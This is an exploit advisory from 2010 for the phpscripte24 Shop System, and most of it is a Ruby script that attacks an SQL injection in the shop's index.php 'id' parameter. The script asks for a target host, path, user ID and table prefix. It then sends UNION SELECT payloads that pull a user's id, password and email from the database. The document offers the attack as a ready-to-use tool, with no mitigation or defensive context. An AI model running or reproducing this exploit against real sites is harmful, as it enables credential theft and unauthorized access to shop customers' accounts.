----------------------------Information------------------------------------------------
+Name : phpscripte24 Shop System SQL Injection Vulnerability Exploit
+Autor : Easy Laster
+ICQ : 11-051-551
+Date   : 09.05.2010
+Script  : phpscripte24 Shop System
+Price : 69.99 �
+Language :PHP
+Discovered by Easy Laster 4004-security-project.com
+Security Group Undergroundagents and 4004-Security-Project 4004-security-project.com
+And all Friends of Cyberlive : R!p,Eddy14,Silent Vapor,Nolok,
Kiba,-tmh-,Dr.ChAoS,HANN!BAL,Kabel,-=Player=-,Lidloses_Auge,
N00bor,Ic3Drag0n,novaca!ne,n3w7u,Maverick010101,s0red,c1ox.
  
---------------------------------------------------------------------------------------
                                                                                       
 ___ ___ ___ ___                         _ _           _____           _         _ 
| | |   |   | | |___ ___ ___ ___ _ _ ___|_| |_ _ _ ___|  _  |___ ___  |_|___ ___| |_
|_  | | | | |_  |___|_ -| -_|  _| | |  _| |  _| | |___|   __|  _| . | | | -_|  _|  _|
  |_|___|___| |_|   |___|___|___|___|_| |_|_| |_  |   |__|  |_| |___|_| |___|___|_|
                                              |___|                 |___|          
  
  
----------------------------------------------------------------------------------------
+Vulnerability : www.site.com/shop/index.php?site=content&id=
----------------------------------------------------------------------------------------
#!/usr/bin/ruby
#4004-security-project.com
#Discovered and vulnerability by Easy Laster
require 'net/http'
print "
#########################################################
#               4004-Security-Project.com               #
#########################################################
# phpscripte24 Shop System SQL Injection Vulnerability  #
#                          Exploit                      #
#               Using Host+Path+userid+prefix           #
#                   demo.com /shop/ 1 user              #
#                         Easy Laster                   #
#########################################################
"
block = "#########################################################"
print ""+ block +""
print "\nEnter host name (site.com)->"
host=gets.chomp
print ""+ block +""
print "\nEnter script path (/forum/)->"
path=gets.chomp
print ""+ block +""
print "\nEnter userid (userid)->"
userid=gets.chomp
print ""+ block +""
print "\nEnter prefix (prefix z.b user)->"
prefix=gets.chomp
print ""+ block +""
begin
dir = "index.php?site=content&id=99999999999/**/UNION/**/SELECT/**/1,2,concat(0x23,0x23,0x23,0x23,0x23,id,0x23,0x23,0x23,0x23,0x23)/**/FROM/**/"+ prefix +"/**/WHERE/**/id="+ userid +""
http = Net::HTTP.new(host, 80)
resp= http.get(path+dir)
print "\nThe ID is  -> "+(/#####(.+)#####/).match(resp.body)[1]
dir = "index.php?site=content&id=99999999999/**/UNION/**/SELECT/**/1,2,concat(0x23,0x23,0x23,0x23,0x23,passwort,0x23,0x23,0x23,0x23,0x23)/**/FROM/**/"+ prefix +"/**/WHERE/**/id="+ userid +""
http = Net::HTTP.new(host, 80)
resp= http.get(path+dir)
print "\nThe Password is  -> "+(/#####(.+)#####/).match(resp.body)[1]
dir = "index.php?site=content&id=99999999999/**/UNION/**/SELECT/**/1,2,concat(0x23,0x23,0x23,0x23,0x23,email,0x23,0x23,0x23,0x23,0x23)/**/FROM/**/"+ prefix +"/**/WHERE/**/id="+ userid +""
http = Net::HTTP.new(host, 80)
resp= http.get(path+dir)
print "\nThe Email is  -> "+(/#####(.+)#####/).match(resp.body)[1]
rescue
print "\nExploit failed"
end